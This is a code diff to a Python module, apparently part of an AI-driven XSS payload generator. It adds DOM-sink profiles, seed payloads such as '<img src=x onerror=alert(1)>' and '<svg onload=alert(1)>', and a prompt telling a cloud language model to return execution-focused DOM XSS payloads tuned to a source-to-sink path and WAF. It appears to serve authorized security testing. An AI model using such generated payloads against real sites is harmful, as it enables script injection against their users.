@@ -146,13 +146,19 @@ def _prompt_for_context(
 
     dom_section = ""
     if dom_runtime:
+        sink = dom_runtime.get("sink", "") or sink_type or "unknown"
+        profile_name, profile_rules = _dom_sink_request_profile(sink)
+        profile_lines = "\n".join(f"  - {rule}" for rule in profile_rules)
         dom_section = (
             "DOM RUNTIME TAINT (highest priority for DOM scanning):\n"
             f"  source_type: {dom_runtime.get('source_type') or 'unknown'}\n"
             f"  source_name: {dom_runtime.get('source_name') or 'unknown'}\n"
-            f"  sink: {dom_runtime.get('sink') or sink_type or 'unknown'}\n"
+            f"  sink: {sink}\n"
             f"  code_location: {dom_runtime.get('code_location') or 'unknown'}\n"
             "  The canary already reached this sink at runtime. Generate payloads for this exact source→sink pair.\n"
+            "DOM SINK PROFILE:\n"
+            f"  profile: {profile_name}\n"
+            f"{profile_lines}\n"
         )
 
     # ── Section 2: Past findings (few-shot examples) ─────────────────────────
@@ -352,6 +358,170 @@ DOM runtime:
 {json.dumps(dom_runtime, indent=2)}
 {waf_line}{lessons_section}{findings_section}Context summary:
 {json.dumps(context_summary, indent=2)}""".strip()
+
+
+def _dom_seed_examples(profile_name: str) -> list[dict[str, Any]]:
+    if profile_name == "html_injection":
+        return [
+            {
+                "payload": "<img src=x onerror=alert(1)>",
+                "title": "img onerror",
+                "test_vector": "?param=<img src=x onerror=alert(1)>",
+                "tags": ["html", "event-handler", "autofire"],
+                "target_sink": "innerHTML",
+                "bypass_family": "event-handler-injection",
+                "risk_score": 88,
+            },
+            {
+                "payload": "<svg onload=alert(1)>",
+                "title": "svg onload",
+                "test_vector": "?param=<svg onload=alert(1)>",
+                "tags": ["svg", "autofire"],
+                "target_sink": "innerHTML",
+                "bypass_family": "svg-namespace",
+                "risk_score": 84,
+            },
+        ]
+    if profile_name == "js_execution":
+        return [
+            {
+                "payload": "alert(1)",
+                "title": "direct alert",
+                "test_vector": "#alert(1)",
+                "tags": ["javascript", "expression"],
+                "target_sink": "eval",
+                "bypass_family": "js-string-breakout",
+                "risk_score": 82,
+            },
+            {
+                "payload": "confirm(1)",
+                "title": "direct confirm",
+                "test_vector": "#confirm(1)",
+                "tags": ["javascript", "expression"],
+                "target_sink": "eval",
+                "bypass_family": "js-string-breakout",
+                "risk_score": 78,
+            },
+        ]
+    return []
+
+
+def _compact_dom_prompt_for_cloud(
+    context: ParsedContext,
+    waf: str | None = None,
+    past_findings: list[Finding] | None = None,
+    past_lessons: list[Any] | None = None,
+) -> str:
+    """Build a compact seeded DOM cloud prompt for simpler sink families."""
+    dom_runtime = _extract_dom_runtime_context(context)
+    sink = dom_runtime.get("sink", "") or (context.dom_sinks[0].sink if context.dom_sinks else "")
+    profile_name, profile_rules = _dom_sink_request_profile(sink)
+    seed_examples = _dom_seed_examples(profile_name)
+
+    findings_section = ""
+    if past_findings:
+        slim = [
+            {
+                "payload": finding.payload,
+                "sink_type": finding.sink_type,
+                "context_type": finding.context_type,
+                "bypass_family": finding.bypass_family,
+            }
+            for finding in past_findings[:3]
+        ]
+        findings_section = "Related findings:\n" + json.dumps(slim, indent=2) + "\n"
+
+    lessons_section = ""
+    if past_lessons:
+        lesson_lines = []
+        for lesson in past_lessons[:3]:
+            title = getattr(lesson, "title", "")
+            summary = getattr(lesson, "summary", "")
+            if title or summary:
+                lesson_lines.append(f"- {title}: {summary}".strip(": "))
+        if lesson_lines:
+            lessons_section = "Runtime lessons:\n" + "\n".join(lesson_lines) + "\n"
+
+    context_summary = {
+        "source": context.source,
+        "frameworks": context.frameworks[:3],
+        "auth": bool(context.auth_notes),
+        "dom_runtime": dom_runtime,
+        "dom_sinks": [
+            {
+                "sink": sink_item.sink,
+                "location": sink_item.location,
+            }
+            for sink_item in context.dom_sinks[:3]
+        ],
+    }
+
+    waf_line = f"WAF: {waf}\n" if waf else ""
+    rule_lines = "\n".join(f"- {rule}" for rule in profile_rules)
+    seed_section = ""
+    if seed_examples:
+        seed_section = "Seed technique examples:\n" + json.dumps(seed_examples, indent=2) + "\n"
+
+    return f"""You are generating authorized DOM XSS test payloads for a cloud model pass.
+Return ONLY a JSON object.
+
+Output schema:
+{{
+  "payloads": [
+    {{
+      "payload": "string",
+      "title": "short name",
+      "explanation": "why it fits this exact DOM context",
+      "test_vector": "exact delivery string",
+      "tags": ["tag1", "tag2"],
+      "target_sink": "{sink or 'unknown'}",
+      "bypass_family": "best-fit family",
+      "risk_score": 1-100
+    }}
+  ]
+}}
+
+Requirements:
+- Produce 4-8 payloads only.
+- Solve the exact DOM source->sink path shown below.
+- Do not return an empty payload list.
+- Prefer materially distinct payload families over near-duplicates.
+- Keep payloads compact and execution-focused.
+- Sink profile: {profile_name}
+{rule_lines}
+
+DOM runtime:
+{json.dumps(dom_runtime, indent=2)}
+{waf_line}{lessons_section}{findings_section}{seed_section}Context summary:
+{json.dumps(context_summary, indent=2)}""".strip()
+
+
+def _cloud_prompt_for_context(
+    context: ParsedContext,
+    reference_payloads: list[Any] | None = None,
+    waf: str | None = None,
+    past_findings: list[Finding] | None = None,
+    past_lessons: list[Any] | None = None,
+) -> str:
+    """Choose a cloud prompt shape based on the DOM sink profile."""
+    dom_runtime = _extract_dom_runtime_context(context)
+    if dom_runtime:
+        sink = dom_runtime.get("sink", "") or (context.dom_sinks[0].sink if context.dom_sinks else "")
+        profile_name, _ = _dom_sink_request_profile(sink)
+        if profile_name != "document_write":
+            return _compact_dom_prompt_for_cloud(
+                context,
+                waf=waf,
+                past_findings=past_findings,
+                past_lessons=past_lessons,
+            )
+    return _prompt_for_context(
+        context,
+        reference_payloads=reference_payloads,
+        waf=waf,
+        past_findings=past_findings,
+        past_lessons=past_lessons,
+    )
 
 
 # ---------------------------------------------------------------------------
@@ -601,7 +771,7 @@ def _generate_with_openai_compat(
     past_findings: list[Finding] | None = None,
     past_lessons: list[Any] | None = None,
 ) -> list[PayloadCandidate]:
-    prompt = _prompt_for_context(
+    prompt = _cloud_prompt_for_context(
         context,
         reference_payloads=reference_payloads,
         waf=waf,
@@ -708,7 +878,7 @@ def _generate_with_cli(
 ) -> tuple[list[PayloadCandidate], str]:
     """Generate payloads by calling the CLI backend, with cross-tool failover."""
     from ai_xss_generator.cli_runner import _trace_preview, generate_via_cli_with_tool
-    prompt = _prompt_for_context(
+    prompt = _cloud_prompt_for_context(
         context,
         reference_payloads=reference_payloads,
         waf=waf,
